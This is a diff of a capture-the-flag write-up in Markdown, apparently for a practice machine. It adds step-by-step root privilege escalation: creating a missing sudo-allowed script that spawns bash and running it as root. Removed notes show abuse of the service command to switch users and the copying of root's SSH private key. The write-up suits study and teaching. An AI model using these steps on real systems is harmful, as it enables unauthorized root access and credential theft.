@@ -190,23 +190,47 @@ Objectives:
    
 ### 12. Escalating privileges to root.
 
+   Once again we'll use `sudo -l` to see what service/script we have access as root without a password.
    
+   ![sudo -l result on user steven](img/21-escalatingtoroot2.png)
+
+   We can see that we have access to the file `/opt/tools/server-health.sh`, if try to list the contents of the file we can see it's non existant. 
+   
+   So we'll create the folder tools:
+
+   `mdkir /opt/tools`
+
+   And the script:
+
+   `nano /opt/tools/server-health.sh`
+
+   Then add the next code to the script:
+
+   ```
+   #!/bin/bash
+
+   bash
+   ```
+   
+   And chmod +x the script:
+
+   `chmod +x /opt/tools/server-health.sh`
+   
+   ![Creating folder and files](img/22-escalatingtoroot3.png)
+
+   Then we can use `sudo -u root /opt/tools/server-health.sh` and get root user access to the machine
+
+   `sudo` will make sure that we run it as root.
+
+   `-u root` will change the user to root
+
+   `and /opt/tools/server-health.sh` will tell the command what script we want to run, and it will be bash to get into the root bash shell.
+
+   ![Execute the command to get the root shell](img/24-escalatingtoroot5.png)
 
 
----
+### 13. Third flag
 
----
-
-# Ignore
-
-13- once in we can cat the file user.txt and get the first flag
-14- using "sudo -l" we'll know what the user has acces to use as root without asking a password, this will return that the user can use /usr/sbin/service.
-15- we will use "sudo -u steven /usr/sbin/service ../../bin/bash" this will change to the user steven with the permissions of max /usr/sbin/service and will make sure that we acces the user with /bin/bash as the interpreter.
-16- repeat "sudo -l" for user steven, will return a "/opt/tools/server-health.sh" file (non existant), we'll create the folder tools and file server-health.sh. this file will contain: 
-#!/bin/bash
-
-bash
-17- then we will "chmod +x /opt/tools/server-health.sh"
-18- we can use "sudo -u root /opt/tools/server-health.sh" to get root access to the machine.
-19- copy the root's ssh private key for direct root access to the machine, and get the flag from inside the root's home folder
-WpScan
+   We can cd into the root home, ls and see the flag:
+   
+   ![Third, root flag](img/25-thirdflag.png)
